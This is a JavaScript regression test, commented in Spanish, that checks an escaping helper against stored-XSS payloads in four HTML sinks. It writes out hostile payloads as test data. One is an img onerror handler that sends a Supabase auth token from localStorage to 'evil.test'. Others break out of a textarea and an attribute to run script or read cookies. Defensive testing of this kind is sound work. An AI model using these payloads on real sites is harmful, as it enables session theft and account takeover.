// SIZO — PoC/Regresión H1: Stored XSS (reproducción local, sin red ni infraestructura)
// Replica los sinks reales de los módulos (_crud.js, empresas.js, seguimiento.js,
// toast.js, modal.js) y verifica que el helper esc() neutraliza el payload.
//
//   node testing/QA/poc-xss.mjs
//
// ANTES de H1: los payloads sobrevivían sin escapar (XSS).
// DESPUÉS de H1: esc() los neutraliza → este script debe reportar TODO PASS.

import { esc } from '../../escape.js'

const PROJECT_REF = 'ifqzdrqzjgsdhjbqkbba' // clave localStorage de supabase-js v2

let pass = 0, fail = 0
function check(nombre, ok, detalle) {
  console.log(`  ${ok ? '✓ PASS' : '✗ FAIL'}  ${nombre}${detalle ? ` — ${detalle}` : ''}`)
  ok ? pass++ : fail++
}
// "Neutralizado" = el payload inyectado no introduce tags ni atributos ejecutables.
// (Los tags legítimos del wrapper —<tr>,<td>,<span>— no cuentan; buscamos las
//  secuencias peligrosas del payload: apertura de <img/<script/<svg y handlers on*=)
const neutralizado = html =>
  !/<\s*(img|script|svg)/i.test(html) && !/on\w+\s*=\s*"/i.test(html)

// 1) Celda de tabla (replica _crud.js / empresas.js) — ahora con esc()
{
  const item = { descripcion:
    `<img src=x onerror="fetch('//evil.test/r?t='+localStorage.getItem('sb-${PROJECT_REF}-auth-token'))">` }
  const cols = [{ key: 'descripcion' }]
  const html = `<tr>${cols.map(c => `<td class="text-sm">${esc(item[c.key] ?? '—')}</td>`).join('')}</tr>`
  console.log('── Sink 1: celda de tabla ──\n  ' + html)
  check('Celda de tabla neutraliza el payload', neutralizado(html))
}

// 2) <textarea> break-out (replica seguimiento.js) — ahora con esc()
{
  const obs = `</textarea><script>document.title='pwned'<\/script>`
  const html = `<textarea name="obs" rows="3">${esc(obs)}</textarea>`
  console.log('\n── Sink 2: <textarea> ──\n  ' + html)
  check('Textarea no permite break-out', !html.includes('</textarea><script>'))
}

// 3) Atributo value="" (replica inputs de empresas.js/usuarios.js) — ahora con esc()
{
  const nombre = `" onfocus="alert(document.cookie)" autofocus x="`
  const html = `<input name="nombre" value="${esc(nombre)}" />`
  console.log('\n── Sink 3: atributo value ──\n  ' + html)
  check('Atributo no permite break-out de comillas', !html.includes('" onfocus='))
}

// 4) Toast / título de modal (replica toast.js / modal.js) — ahora con esc()
{
  const msg = `Empresa "<img src=x onerror=alert(1)>" creada`
  const html = `<span class="toast-message">${esc(msg)}</span>`
  console.log('\n── Sink 4: toast/modal ──\n  ' + html)
  check('Toast/modal neutraliza el payload', neutralizado(html))
}

console.log(`\n═══ RESULTADO H1: ${pass} PASS · ${fail} FAIL ═══`)
process.exit(fail ? 1 : 0)
